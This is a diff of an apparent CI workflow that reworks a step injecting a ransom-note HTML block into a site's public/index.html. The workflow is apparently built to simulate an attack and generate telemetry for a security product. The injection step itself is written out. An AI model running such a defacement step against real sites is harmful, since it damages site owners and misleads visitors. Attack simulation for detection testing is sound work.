@@ -114,12 +114,14 @@ jobs:
             </script>
             RANSOM
             
-            # Bulletproof HTML injection: Strip closing tags, append payload, and close it back up.
-            sudo sed -i '/<\/body>/d' public/index.html
-            sudo sed -i '/<\/html>/d' public/index.html
-            sudo bash -c "cat /tmp/ransom.html >> public/index.html"
-            sudo bash -c "echo '  </body>' >> public/index.html"
-            sudo bash -c "echo '</html>' >> public/index.html"
+            # Completely avoiding sed for the injection. We will just chop off the last two lines (</body>\n</html>) using head, append the ransom, and re-append the closing tags.
+            head -n -2 public/index.html > /tmp/index.html.tmp
+            cat /tmp/ransom.html >> /tmp/index.html.tmp
+            echo '  </body>' >> /tmp/index.html.tmp
+            echo '</html>' >> /tmp/index.html.tmp
+            sudo mv /tmp/index.html.tmp public/index.html
+            sudo chown ubuntu:ubuntu public/index.html
+            
             sudo rm /tmp/ransom.html
             
             echo "==== 2. SIMULATING TELEMETRY FOR WIZ ===="
